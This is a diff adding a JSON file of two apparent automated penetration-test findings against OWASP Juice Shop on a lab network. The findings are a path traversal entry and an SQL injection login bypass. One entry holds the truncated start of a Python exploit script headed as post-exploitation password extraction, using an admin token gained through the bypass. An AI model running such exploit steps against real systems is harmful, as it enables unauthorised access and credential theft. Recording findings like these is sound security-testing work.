@@ -1,0 +1,22 @@
+[
+  {
+    "id": "path_traversal_juiceshop",
+    "type": "path traversal",
+    "target": "juiceshop",
+    "details": "Admin JWT token via SQLi bypass: admin@juice-sh.op\n```bash\npython3 << 'PYEOF'\nimport requests\nimport json\nBASE = \"http://172.21.0.5:3000\"\ns = requests.Session()\nprint(\"=== POST-EXPLOIT: EXTRACTING PAS",
+    "severity": "high",
+    "exploited": true,
+    "exploit_attempts": 2,
+    "not_exploitable_reason": ""
+  },
+  {
+    "id": "sql_injection_juiceshop",
+    "type": "sql injection",
+    "target": "juiceshop",
+    "details": "Auto-detected SQLi auth bypass at http://juiceshop:3000/rest/user/login. Evidence: {\"authentication\":{\"token\":\"<<JWT_REDACTED>>",
+    "severity": "high",
+    "exploited": true,
+    "exploit_attempts": 1,
+    "not_exploitable_reason": ""
+  }
+]
